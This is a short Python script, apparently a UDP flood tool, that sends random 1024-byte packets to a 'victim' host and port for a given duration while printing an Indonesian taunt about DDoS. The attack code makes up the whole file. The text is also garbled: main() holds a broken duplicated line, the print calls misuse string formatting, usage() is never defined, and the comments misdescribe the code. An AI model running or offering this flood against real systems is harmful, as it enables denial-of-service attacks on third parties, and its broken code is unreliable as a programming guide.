#!/usr/bin/env python3
import time
import socket
import random
import sys

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 5000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print       (" - - > DDOS AMPE MAMPUS < - - ")%(sent, victim, vport)
        print       (" - - > DDOS AMPE MAMPUS < - - ")%(sent, victim, vport)
        print       (" - - > DDOS AMPE MAMPUS < - - ")%(sent, victim, vport) 
        print       (" - - > DDOS AMPE MAMPUS < - - ")%(sent, victim, vport)
    
def main():
    print len(sys.a    print len(sys.a
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()